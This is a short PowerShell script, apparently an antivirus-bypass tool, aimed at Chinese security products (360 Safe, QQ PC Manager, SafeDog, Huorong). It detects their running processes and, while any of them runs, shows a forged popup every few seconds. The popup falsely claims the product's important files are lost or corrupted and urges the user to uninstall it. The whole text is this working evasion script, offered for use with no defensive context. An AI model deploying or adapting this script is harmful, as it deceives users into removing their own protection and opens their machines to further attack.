function ByePass{
    $Avlist=@{
        '360安全卫士'='ZhuDongFangYu','360Safe','360Tray';
        'QQ电脑管家'='QQPCRTP'
        '安全狗'='SafeDog','safedog','SafeDogServerUI','SafeDogTray'
        '火绒安全软件'='HispsTray','usysdiag'
    }
    foreach($Proces in $Avlist.Keys){
        if((Get-Process $Avlist[$Proces] -ErrorAction SilentlyContinue) -eq $Null){
            $msg='未运行：'+$Proces
            Write-Host $msg
        }
        else{
            while((Get-Process $Avlist[$Proces] -ErrorAction SilentlyContinue) -ne $Null){
                $msg='运行中：'+$Proces
                Write-Host $msg
                $wshell=New-Object -ComObject Wscript.Shell
                $msg=$Proces +'重要文件丢失或损坏，请卸载'+$Proces
                $Status=$wshell.Popup($msg,0,$Proces,0+16)
                Sleep 3
            }
        }
    }
}
ByePass